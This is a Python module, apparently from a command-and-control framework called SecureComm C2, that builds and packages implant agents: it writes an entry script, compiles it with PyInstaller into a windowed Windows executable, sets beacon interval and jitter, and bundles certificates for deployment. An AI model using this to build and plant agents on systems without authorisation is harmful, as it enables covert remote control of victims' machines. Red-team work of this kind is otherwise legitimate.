"""
Agent Builder Module for SecureComm C2

Handles generation of Windows/Linux agent executables and packaging
with configuration files and certificates.

Author: SecureComm C2 Team
Version: 1.0.0
"""

import os
import sys
import json
import shutil
import logging
import subprocess
import tempfile
import zipfile
from pathlib import Path
from typing import Optional, Dict, Any, Tuple
from datetime import datetime

logger = logging.getLogger(__name__)

# Default paths
AGENTS_DIR = Path("payloads/agents")
LAUNCHER_PATH = Path("launcher.py")


class AgentBuilder:
    """
    Builder for creating agent executables and deployment packages.
    
    Features:
    - Windows .exe generation via PyInstaller
    - Agent configuration creation
    - Certificate bundling
    - Deployment package creation
    """
    
    def __init__(self, agents_dir: Optional[Path] = None):
        self.agents_dir = agents_dir or AGENTS_DIR
        self.agents_dir.mkdir(parents=True, exist_ok=True)
        
    def check_pyinstaller(self) -> bool:
        """Check if PyInstaller is installed, install if needed"""
        try:
            import PyInstaller
            logger.info("PyInstaller already installed")
            return True
        except ImportError:
            logger.info("Installing PyInstaller...")
            try:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", "pyinstaller"],
                    check=True,
                    capture_output=True
                )
                logger.info("PyInstaller installed successfully")
                return True
            except subprocess.CalledProcessError as e:
                logger.error(f"Failed to install PyInstaller: {e}")
                return False
    
    def generate_windows_agent(
        self,
        agent_id: str,
        server: str,
        port: int = 8443,
        output_dir: Optional[Path] = None
    ) -> Tuple[bool, Dict[str, Any]]:
        """
        Generate Windows agent executable using PyInstaller
        
        Args:
            agent_id: Unique identifier for the agent
            server: C2 server IP address
            port: C2 server port
            output_dir: Custom output directory (optional)
            
        Returns:
            Tuple of (success: bool, result: dict with paths and info)
        """
        logger.info(f"Generating Windows agent for {agent_id}")
        
        # Check PyInstaller
        if not self.check_pyinstaller():
            return False, {"error": "PyInstaller not available"}
        
        # Setup output directory
        if output_dir is None:
            output_dir = self.agents_dir / agent_id
        output_dir.mkdir(parents=True, exist_ok=True)
        
        # Create build directory
        build_dir = output_dir / "build"
        build_dir.mkdir(exist_ok=True)
        
        try:
            # Create agent entry point script
            entry_script = self._create_entry_script(agent_id, server, port, build_dir)
            
            # Run PyInstaller
            cmd = [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--name", f"securecomm_agent_{agent_id}",
                "--distpath", str(output_dir / "dist"),
                "--workpath", str(build_dir / "work"),
                "--specpath", str(build_dir),
                "--clean",
                "--noconfirm",
                "--windowed" if os.name == 'nt' else "--console",
                str(entry_script)
            ]
            
            logger.info(f"Running PyInstaller: {' '.join(cmd)}")
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                cwd=str(Path(__file__).parent.parent.parent)  # Project root
            )
            
            if result.returncode != 0:
                logger.error(f"PyInstaller failed: {result.stderr}")
                return False, {"error": f"PyInstaller failed: {result.stderr}"}
            
            # Determine executable path
            exe_name = f"securecomm_agent_{agent_id}.exe" if os.name == 'nt' else f"securecomm_agent_{agent_id}"
            exe_path = output_dir / "dist" / exe_name
            
            if not exe_path.exists():
                # Try alternative naming
                alt_exe = output_dir / "dist" / f"securecomm_agent_{agent_id}"
                if alt_exe.exists():
                    exe_path = alt_exe
            
            logger.info(f"Agent executable generated: {exe_path}")
            
            return True, {
                "agent_id": agent_id,
                "executable_path": str(exe_path),
                "server": server,
                "port": port,
                "platform": "windows",
                "build_time": datetime.now().isoformat()
            }
            
        except Exception as e:
            logger.error(f"Error generating agent: {e}", exc_info=True)
            return False, {"error": str(e)}
    
    def _create_entry_script(
        self,
        agent_id: str,
        server: str,
        port: int,
        build_dir: Path
    ) -> Path:
        """Create temporary entry point script for PyInstaller"""
        
        script_content = f'''#!/usr/bin/env python3
"""
SecureComm Agent Entry Point
Auto-generated for {agent_id}
"""

import sys
import os
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

from securecomm.agent import SecureAgent

def main():
    """Start the agent"""
    # Get certificate paths (bundled with executable)
    exe_dir = Path(sys.executable).parent
    certs_dir = exe_dir / "certs"
    
    # Default paths
    ca_cert = certs_dir / "ca_root.crt"
    agent_cert = certs_dir / "{agent_id}.crt"
    agent_key = certs_dir / "{agent_id}.key"
    
    # Check if certs exist
    if not ca_cert.exists():
        print(f"[ERROR] CA certificate not found: {{ca_cert}}")
        sys.exit(1)
    
    if not agent_cert.exists() or not agent_key.exists():
        print(f"[ERROR] Agent certificates not found")
        print(f"  Expected: {{agent_cert}}")
        print(f"  Expected: {{agent_key}}")
        sys.exit(1)
    
    # Create and run agent
    agent = SecureAgent(
        agent_id="{agent_id}",
        ca_cert_path=str(ca_cert),
        agent_cert_path=str(agent_cert),
        agent_key_path=str(agent_key),
        server_host="{server}",
        server_port={port}
    )
    
    try:
        print(f"[+] Agent {{agent_id}} connecting to {{server}}:{port}")
        agent.run()
    except KeyboardInterrupt:
        print("\\n[!] Agent stopped by user")
        agent.stop()
    except Exception as e:
        print(f"[ERROR] Agent error: {{e}}")
        sys.exit(1)

if __name__ == "__main__":
    main()
'''
        
        script_path = build_dir / f"agent_entry_{agent_id}.py"
        with open(script_path, 'w') as f:
            f.write(script_content)
        
        return script_path
    
    def create_agent_config(
        self,
        agent_id: str,
        server: str,
        port: int = 8443,
        platform: str = "windows"
    ) -> Tuple[bool, Dict[str, Any]]:
        """
        Create agent configuration file
        
        Returns:
            Tuple of (success: bool, result: dict with config path and content)
        """
        config = {
            "agent_id": agent_id,
            "server": server,
            "port": port,
            "platform": platform,
            "beacon_interval": 60,
            "jitter": 0.3,
            "timeout": 300,
            "max_retries": 3,
            "created_at": datetime.now().isoformat()
        }
        
        # Save config
        agent_dir = self.agents_dir / agent_id
        agent_dir.mkdir(parents=True, exist_ok=True)
        
        config_path = agent_dir / "config.json"
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
        
        logger.info(f"Agent config created: {config_path}")
        
        return True, {
            "agent_id": agent_id,
            "config_path": str(config_path),
            "config": config
        }
    
    def package_agent(
        self,
        agent_id: str,
        include_certs: bool = True,
        create_zip: bool = True
    ) -> Tuple[bool, Dict[str, Any]]:
        """
        Package agent with configuration and certificates
        
        Args:
            agent_id: Agent identifier
            include_certs: Whether to include PKI certificates
            create_zip: Whether to create ZIP package
            
        Returns:
            Tuple of (success: bool, result: dict with package info)
        """
        agent_dir = self.agents_dir / agent_id
        
        if not agent_dir.exists():
            return False, {"error": f"Agent directory not found: {agent_dir}"}
        
        try:
            # Create certs directory if including certificates
            if include_certs:
                certs_dir = agent_dir / "certs"
                certs_dir.mkdir(exist_ok=True)
                
                # Copy required certificates
                pki_ca = Path("data/pki/ca/ca_root.crt")
                pki_agent_cert = Path(f"data/pki/agents/{agent_id}.crt")
                pki_agent_key = Path(f"data/pki/agents/{agent_id}.key")
                
                if pki_ca.exists():
                    shutil.copy(pki_ca, certs_dir / "ca_root.crt")
                if pki_agent_cert.exists():
                    shutil.copy(pki_agent_cert, certs_dir / f"{agent_id}.crt")
                if pki_agent_key.exists():
                    shutil.copy(pki_agent_key, certs_dir / f"{agent_id}.key")
                
                logger.info(f"Certificates packaged for {agent_id}")
            
            # Create ZIP package if requested
            if create_zip:
                zip_path = self.agents_dir / f"{agent_id}_package.zip"
                
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                    for file_path in agent_dir.rglob("*"):
                        if file_path.is_file():
                            arcname = file_path.relative_to(agent_dir)
                            zf.write(file_path, arcname)
                
                logger.info(f"Agent package created: {zip_path}")
                
                return True, {
                    "agent_id": agent_id,
                    "package_dir": str(agent_dir),
                    "zip_path": str(zip_path),
                    "include_certs": include_certs
                }
            
            return True, {
                "agent_id": agent_id,
                "package_dir": str(agent_dir),
                "include_certs": include_certs
            }
            
        except Exception as e:
            logger.error(f"Error packaging agent: {e}")
            return False, {"error": str(e)}
    
    def build_agent(
        self,
        agent_id: str,
        server: str,
        port: int = 8443,
        platform: str = "windows"
    ) -> Tuple[bool, Dict[str, Any]]:
        """
        Complete agent build process: executable + config + packaging
        
        This is the main method for building a complete agent package.
        
        Args:
            agent_id: Unique agent identifier
            server: C2 server address
            port: C2 server port
            platform: Target platform (windows/linux)
            
        Returns:
            Tuple of (success: bool, result: dict with all paths and info)
        """
        logger.info(f"Building complete agent package for {agent_id}")
        
        # Step 1: Create configuration
        config_success, config_result = self.create_agent_config(
            agent_id, server, port, platform
        )
        
        if not config_success:
            return False, {"error": f"Config creation failed: {config_result.get('error')}"}
        
        # Step 2: Generate executable (Windows only for now)
        if platform == "windows":
            exe_success, exe_result = self.generate_windows_agent(
                agent_id, server, port
            )
            
            if not exe_success:
                return False, {"error": f"Executable generation failed: {exe_result.get('error')}"}
        else:
            exe_result = {"executable_path": None, "note": "Linux agent requires manual build"}
        
        # Step 3: Package everything
        pkg_success, pkg_result = self.package_agent(agent_id, include_certs=True, create_zip=True)
        
        if not pkg_success:
            return False, {"error": f"Packaging failed: {pkg_result.get('error')}"}
        
        # Build complete result
        return True, {
            "agent_id": agent_id,
            "platform": platform,
            "server": server,
            "port": port,
            "config_path": config_result["config_path"],
            "executable_path": exe_result.get("executable_path"),
            "package_dir": pkg_result["package_dir"],
            "zip_path": pkg_result.get("zip_path"),
            "build_time": datetime.now().isoformat(),
            "status": "complete"
        }


# Convenience function
def build_agent(agent_id: str, server: str, port: int = 8443) -> Tuple[bool, Dict[str, Any]]:
    """
    Quick function to build an agent package
    
    Usage:
        success, result = build_agent("agent_01", "192.168.1.100", 8443)
    """
    builder = AgentBuilder()
    return builder.build_agent(agent_id, server, port, platform="windows")


if __name__ == "__main__":
    # Test usage
    logging.basicConfig(level=logging.INFO)
    
    success, result = build_agent("test_agent", "127.0.0.1", 8443)
    
    if success:
        print(f"[+] Agent built successfully!")
        print(f"    Config: {result['config_path']}")
        print(f"    Executable: {result['executable_path']}")
        print(f"    Package: {result['zip_path']}")
    else:
        print(f"[-] Build failed: {result.get('error')}")
